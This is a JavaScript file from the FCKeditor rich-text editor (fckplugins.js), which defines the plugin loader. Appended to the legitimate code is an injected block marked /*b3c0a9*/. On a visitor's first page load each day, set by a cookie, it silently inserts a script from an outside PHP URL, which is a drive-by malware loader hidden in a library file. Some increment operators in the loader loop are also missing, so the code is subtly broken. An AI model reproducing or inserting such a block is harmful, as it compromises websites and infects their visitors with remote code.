/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckplugins.js
 * 	Defines the FCKPlugins object that is responsible for loading the Plugins.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

var FCKPlugins = FCK.Plugins = new Object() ;
FCKPlugins.ItemsCount = 0 ;
FCKPlugins.Loaded = false ;
FCKPlugins.Items = new Object() ;

// Set the defined plugins scripts paths.
for ( var i = 0 ; i < FCKConfig.Plugins.Items.length ; i   )
{
	var oItem = FCKConfig.Plugins.Items[i] ;
	FCKPlugins.Items[ oItem[0] ] = new FCKPlugin( oItem[0], oItem[1], oItem[2] ) ;
	FCKPlugins.ItemsCount   ;
}
	
FCKPlugins.Load = function()
{
	// Load all items.
	for ( var s in this.Items )
		this.Items[s].Load() ;
	
	// Mark as loaded.
	this.Loaded = true ;
	
	// This is a self destroyable function (must be called once).
	FCKPlugins.Load = null ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
